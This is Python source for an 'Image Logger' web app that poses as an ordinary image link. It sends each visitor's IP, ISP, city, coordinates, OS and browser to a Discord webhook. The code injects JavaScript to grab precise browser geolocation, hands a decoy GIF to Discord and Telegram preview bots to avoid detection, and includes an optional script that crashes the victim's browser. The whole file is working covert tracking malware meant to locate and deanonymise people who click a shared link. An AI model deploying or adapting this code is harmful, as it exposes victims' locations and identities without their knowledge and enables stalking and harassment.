import os
import base64
import json
from urllib.parse import urlsplit, parse_qsl, unquote
from io import BytesIO

try:
    import requests
    import httpagentparser
except ImportError:
    import subprocess
    import sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests', 'httpagentparser'])
    import requests
    import httpagentparser

webhook_url = os.environ.get('DISCORD_WEBHOOK_URL') or os.environ.get('WEBHOOK_URL') or ''
if not webhook_url:
    try:
        with open('webhook-config.json', 'r') as f:
            cfg = json.load(f)
            webhook_url = cfg.get('WEBHOOK_URL', cfg.get('DISCORD_WEBHOOK_URL', ''))
    except:
        pass

config = {
    "webhook": webhook_url,
    "image": "https://link-to-your-image.here",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

def botCheck(ip, useragent):
    if ip and (ip.startswith("34.") or ip.startswith("35.")):
        return "Discord"
    if useragent and ("Discordbot/" in useragent or "Discord Webhooks" in useragent):
        return "Discord"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not config["webhook"] or not ip:
        return None

    if ip.startswith(blacklistedIPs):
        return None

    bot = botCheck(ip, useragent)

    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                })
            except Exception:
                pass
        return None

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {}

    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""

    if info.get("hosting"):
        if config["antiBot"] in (3, 4):
            return None
        if config["antiBot"] in (1, 2):
            if not info.get("proxy"):
                ping = ""

    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
    except:
        os_name, browser = "Unknown", "Unknown"

    desc = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```"""

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": desc,
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except Exception:
        pass
    return info


def app(environ, start_response):
    try:
        method = environ.get('REQUEST_METHOD', 'GET')
        path_info = environ.get('PATH_INFO', '/')
        query_string = environ.get('QUERY_STRING', '')

        headers = {}
        for key, value in environ.items():
            if key.startswith('HTTP_'):
                headers[key[5:].lower()] = value

        ip = headers.get('x-forwarded-for', '').split(',')[0].strip() or headers.get('x-real-ip', '') or environ.get('REMOTE_ADDR', 'unknown')
        user_agent = headers.get('user-agent', 'unknown')

        import sys
        print(f"[DEBUG] IP={ip}, UA={user_agent}, xff={headers.get('x-forwarded-for', '')}, all_headers={list(headers.keys())}", file=sys.stderr)

        s = path_info
        dic = dict(parse_qsl(query_string))

        if config["imageArgument"]:
            if dic.get("url") or dic.get("id"):
                try:
                    img_url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
                except:
                    img_url = config["image"]
            else:
                img_url = config["image"]
        else:
            img_url = config["image"]

        data = f'''<style>body {{margin: 0; padding: 0;}} div.img {{background-image: url('{img_url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh;}}</style><div class="img"></div>'''.encode()

        if ip.startswith(blacklistedIPs):
            start_response('200 OK', [('Content-Type', 'image/gif'), ('Cache-Control', 'public, max-age=86400')])
            return [bytes(binaries["loading"])]

        if botCheck(ip, user_agent):
            if config["buggedImage"]:
                makeReport(ip, endpoint=s, url=img_url)
                start_response('200 OK', [('Content-Type', 'image/gif'), ('Cache-Control', 'public, max-age=86400')])
                return [bytes(binaries["loading"])]
            else:
                makeReport(ip, endpoint=s, url=img_url)
                start_response('302 Found', [('Location', img_url)])
                return [b'']

        else:
            if dic.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(dic.get("g")).decode()
                except:
                    location = None
                result = makeReport(ip, user_agent, location, s, url=img_url)
            else:
                result = makeReport(ip, user_agent, endpoint=s, url=img_url)

            message = config["message"]["message"]

            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", ip)
                message = message.replace("{isp}", str(result.get('isp', 'Unknown')))
                message = message.replace("{asn}", str(result.get('as', 'Unknown')))
                message = message.replace("{country}", str(result.get('country', 'Unknown')))
                message = message.replace("{region}", str(result.get('regionName', 'Unknown')))
                message = message.replace("{city}", str(result.get('city', 'Unknown')))
                message = message.replace("{lat}", str(result.get('lat', '')))
                message = message.replace("{long}", str(result.get('lon', '')))
                message = message.replace("{timezone}", str(result.get('timezone', 'Unknown')))
                message = message.replace("{mobile}", str(result.get('mobile', 'Unknown')))
                message = message.replace("{vpn}", str(result.get('proxy', 'Unknown')))
                message = message.replace("{bot}", str(result.get('hosting', 'Unknown')))

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()

            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""

            start_response('200 OK', [('Content-Type', datatype)])
            return [data]

    except Exception as e:
        import traceback
        traceback.print_exc()
        start_response('500 Internal Server Error', [('Content-Type', 'text/html')])
        return [b'500 - Internal Server Error']


handler = app
